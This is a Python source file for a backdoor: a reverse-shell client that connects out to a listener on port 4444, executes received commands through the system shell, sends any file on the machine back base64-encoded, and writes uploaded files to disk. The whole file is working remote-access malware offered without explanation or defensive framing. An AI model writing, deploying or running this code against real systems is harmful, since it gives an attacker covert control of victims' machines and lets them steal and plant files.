#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.connect((ip, port))
        except Exception as e:
            print(f"Error connecting to {ip}:{port} - {e}")
            exit()

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode('utf-8'))
        except Exception as e:
            print(f"Error sending data: {e}")
            self.connection.close()
            exit()

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except ValueError:
                continue
            except Exception as e:
                print(f"Error receiving data: {e}")
                self.connection.close()
                exit()

    def execute_system_command(self, command):
        try:
            if command[0] == 'cd' and len(command) > 1:
                if os.path.isdir(command[1]):
                    os.chdir(command[1])
                    return f"[+] Changed directory to {os.getcwd()}"
                else:
                    return f"[-] Directory does not exist: {command[1]}"
            else:
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                if result.returncode == 0:
                    return result.stdout.strip()
                else:
                    return f"Error: {result.stderr.strip()}"
        except Exception as e:
            return f"Error executing command: {str(e)}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode('utf-8')
        except FileNotFoundError:
            return f"[-] File not found: {path}"
        except Exception as e:
            return f"Error reading file: {str(e)}"

    def write_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return "[+] Upload Successful"
        except Exception as e:
            return f"Error writing file: {str(e)}"

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
                self.reliable_send(command_result)
            except Exception as e:
                self.reliable_send(f"Error handling command: {str(e)}")

back = Backdoor("ip address of the listener", 4444)
back.run()
